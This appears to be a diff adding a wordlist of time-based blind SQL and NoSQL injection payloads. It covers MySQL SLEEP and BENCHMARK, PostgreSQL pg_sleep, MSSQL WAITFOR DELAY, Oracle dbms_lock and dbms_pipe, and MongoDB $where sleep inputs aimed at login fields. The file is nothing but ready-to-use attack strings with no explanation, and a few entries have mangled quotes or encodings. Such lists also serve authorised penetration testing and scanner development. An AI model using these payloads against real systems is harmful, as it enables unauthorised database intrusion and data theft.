@@ -1,0 +1,105 @@
+' OR SLEEP(5)--
+' OR SLEEP(5)#
+' OR SLEEP(5)='
+" OR SLEEP(5)#
+" OR SLEEP(5)="
+') OR SLEEP(5)='
+')) OR SLEEP(5)='
+' OR IF(1=1, SLEEP(5), 0) --
+AnD SLEEP(5)
+AnD SLEEP(5)#
+AnD SLEEP(5)--
+ORDER BY SLEEP(5)
+ORDER BY SLEEP(5)#
+ORDER BY SLEEP(5)--
+SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
+SLEEP(5)#
+SLEEP(5)--
+SLEEP(5)="
+SLEEP(5)='
+or SLEEP(5)
+or SLEEP(5)#
+or SLEEP(5)--
+or SLEEP(5)="
+or SLEEP(5)='
++ SLEEP(10) + '
+0'XOR(if(now()=sysdate(),sleep(6),0))XOR'Z
+'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
+1'XOR(94102*if(now()=sysdate(),sleep(6),0))XOR'Z
+if(now()=sysdate(),sleep(20),0)
+'XOR(if(now()=sysdate(),sleep(33),0))OR'
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
+(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
+(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'"+(select(0)from(select(sleep(6)))v)+"*/
+(SELECT(0)FROM(SELECT(SLEEP(10)))a)
+AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe'
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+AND (SELECT 7415 FROM (SELECT(SLEEP(10)))CwkU) AND (7515=7515
+AND BENCHMARK(1000000, MD5('test'))
+'AND 4564=(SELECT 4564 FROM PG_SLEEP(10)) OR '04586'='4586 
+' OR BENCHMARK(1000000, MD5('test'))--
+' AND 1=(SELECT 1 FROM PG_SLEEP(10)) OR '1'='0
+' OR pg_sleep(5)--
+" OR pg_sleep(5)--
+‘ OR pg_sleep(5) --
+1 OR pg_sleep(5) --
+1) OR pg_sleep(5)--
+1)) OR pg_sleep(5)--
+') OR pg_sleep(5)--
+')) OR pg_sleep(5)--
+or SELECT pg_sleep(5);
+(SELECT pg_sleep(5))
+pg_sleep(5)--
+pg_SLEEP(5)
+pg_SLEEP(5)#
+pg_SLEEP(5)--
+') OR 11=(SELECT 11 FROM PG_SLEEP(6))--
+');(SELECT 4564 FROM PG_SLEEP(5))--
+AND pg_sleep(5)
+''||(select 1 from (select pg_sleep(6))x)||'
+'));waitfor delay '0:0:5'--
+');waitfor delay '0:0:5'--
+';waitfor delay '0:0:5'--
+);waitfor delay '0:0:5'--
+));waitfor delay '0:0:5'--
+;waitfor delay '00:00:05'
+;waitfor delay '00:00:05'#
+;waitfor delay '00:00:05'--
+;waitfor delay ‘0:0:5’ —-
+‘;WAITFOR DELAY ‘0:0:5’ —-
+“;waitfor delay ‘0:0:5’ —-
+‘);waitfor delay ‘0:0:5’ —-
+“);waitfor delay ‘0:0:5’ —-
+“));waitfor delay ‘0:0:5’ —-
+‘));waitfor delay ‘0:0:5’ —-
+“));waitfor delay ‘0:0:5’ —-
+“);waitfor delay ‘0:0:5’ —-
+';%20waitfor%20delay%20'0:0:6'%20--%20
+‘;%5waitfor%5delay%5’0:0:5'%5 -- %5
+132'; waitfor delay '0:0:6' -- 
+'>;WAITFOR DELAY '00:00:5'--
+' WAITFOR DELAY ‘0:0:5’ —-
+' AND 1=CAST((SELECT version()) AS int) --
+' AND dbms_pipe.receive_message(('a'),5) -- 
+" AND dbms_pipe.receive_message(('a'),5) -- 
+) AND dbms_pipe.receive_message(('a'),5) -- 
+' AND dbms_lock.sleep(5) -- 
+" AND dbms_lock.sleep(5) -- 
+) AND dbms_lock.sleep(5) -- 
+' OR dbms_pipe.receive_message(('a'),5) -- 
+" OR dbms_pipe.receive_message(('a'),5) -- 
+' OR dbms_lock.sleep(5) -- 
+" OR dbms_lock.sleep(5) -- 
+'; BEGIN dbms_lock.sleep(5); END; -- 
+username[$where]=sleep(5000)
+password[$where]=sleep(5000)
+q[$where]=sleep(5000)
+id[$where]=sleep(5000)
+username[$where]=this.username=='admin' && sleep(5000)
+password[$where]=this.password=='pass' && sleep(5000)
+username[$where]=function(){if(this.username=='admin') sleep(5000); return true;}
+password[$where]=function(){if(this.password=='1234') sleep(5000); return true;}
